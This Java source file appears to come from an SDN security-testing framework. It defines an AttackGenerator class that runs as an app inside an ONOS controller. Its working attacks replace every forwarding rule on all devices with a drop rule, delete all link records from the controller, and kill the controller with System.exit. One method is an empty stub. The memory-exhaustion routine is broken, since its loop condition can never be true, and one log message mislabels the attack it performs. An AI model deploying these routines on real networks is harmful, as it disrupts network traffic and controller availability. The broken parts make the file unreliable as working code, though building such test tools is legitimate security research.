package iitp2018;

import org.deltaproject.onosagent.AppAgent;
import org.onosproject.core.ApplicationId;
import org.onosproject.core.CoreService;
import org.onosproject.net.Device;
import org.onosproject.net.PortNumber;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.flow.*;
import org.onosproject.net.flow.instructions.Instruction;
import org.onosproject.net.flow.instructions.Instructions;
import org.onosproject.net.link.LinkAdminService;
import org.onosproject.net.link.LinkService;
import org.onosproject.openflow.controller.OpenFlowController;
import org.slf4j.Logger;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.Random;

import static org.slf4j.LoggerFactory.getLogger;

public class AttackGenerator {

    protected OpenFlowController ctrl;
    protected DeviceService ds;
    protected FlowRuleService frs;
    protected CoreService cs;
    protected LinkService ls;
    protected LinkAdminService las;

    private final Logger log = getLogger(getClass());

    public AttackGenerator(OpenFlowController ctrl, DeviceService ds, FlowRuleService frs,
                           CoreService cs, LinkService ls, LinkAdminService las) {
        this.ctrl = ctrl;
        this.ds = ds;
        this.frs = frs;
        this.cs = cs;
        this.ls = ls;
        this.las = las;
    }

    // case1
    public void loopInjector() {

    }

    // case2: allow rule -> drop rule
    public void modifyOutputActions() {
        System.out.println("[ATTACK] Modify flow rule's output to drop actions");
        Iterator<Device> deviceIterator = ds.getAvailableDevices().iterator();
        while (deviceIterator.hasNext()) {
            Device d = deviceIterator.next();
            Iterator<FlowEntry> ruleIterator = frs.getFlowEntries(d.id()).iterator();
            while (ruleIterator.hasNext()) {
                FlowEntry entry = ruleIterator.next();
                entry.treatment().allInstructions().forEach(originInst -> {
                    if (originInst.type() == Instruction.Type.OUTPUT) {
                        Instructions.OutputInstruction outputInst = (Instructions.OutputInstruction) originInst;
                        if (outputInst.port() != PortNumber.CONTROLLER) {
                            TrafficTreatment newTreatment = DefaultTrafficTreatment.builder()
                                    .build();
                            ApplicationId targetAppId = cs.getAppId(entry.appId());
                            FlowRule rule = DefaultFlowRule.builder()
                                    .forDevice(d.id())
                                    .withSelector(entry.selector())
                                    .withTreatment(newTreatment)
                                    .withPriority(entry.priority())
                                    .fromApp(targetAppId)
                                    .makeTemporary(entry.timeout())
                                    .build();

                            log.info("flow rule: {}", rule);

                            FlowRuleOperations.Builder ops = FlowRuleOperations.builder();
                            ops.add(rule);
                            String description = "[AppAgent] Modify flow rules having decrement TTL values";
                            frs.apply(ops.build(new FlowRuleOperationsContext() {
                                @Override
                                public void onSuccess(FlowRuleOperations ops) {
                                    log.info(description + " success: " + ops.toString() + ", " + rule.toString());
                                }

                                @Override
                                public void onError(FlowRuleOperations ops) {
                                    log.info(description + " error: " + ops.toString() + ", " + rule.toString());
                                }
                            }));
                        }
                    }
                });
            }
        }
    }

    // case3
    public void removeLinkInformation() {
        System.out.println("[ATTACK] Remove link information from controller's DB");
        ls.getLinks().forEach(l -> {
            System.out.println("[AppAgent] Remove link src: " + l.src() + ", dst: " + l.dst());
            las.removeLink(l.src(), l.dst());
        });


    }

    /** case4: execute exit command on controller
    /*  related permissions:
    */
    public void exitController() {
        System.out.println("[ATTACK] System Exit Command Execution");
        System.exit(0);
    }

    /** case5: exhaust memory JVM's memory resources
     * related permissions:
     */
    public void exhaustResources() {
        System.out.println("[ATTACK] Resource Exhaustion : Memory");

        long[][] ary;
        ArrayList<long[][]> arry;

        arry = new ArrayList<long[][]>();
        Random ran = new Random();

        int cnt = 0;
        while (cnt > Integer.MAX_VALUE) {
            ary = new long[Integer.MAX_VALUE][Integer.MAX_VALUE];
            arry.add(new long[Integer.MAX_VALUE][Integer.MAX_VALUE]);
            ary[ran.nextInt(Integer.MAX_VALUE)][ran.nextInt(Integer.MAX_VALUE)] = 1;
            cnt++;
        }
    }
}
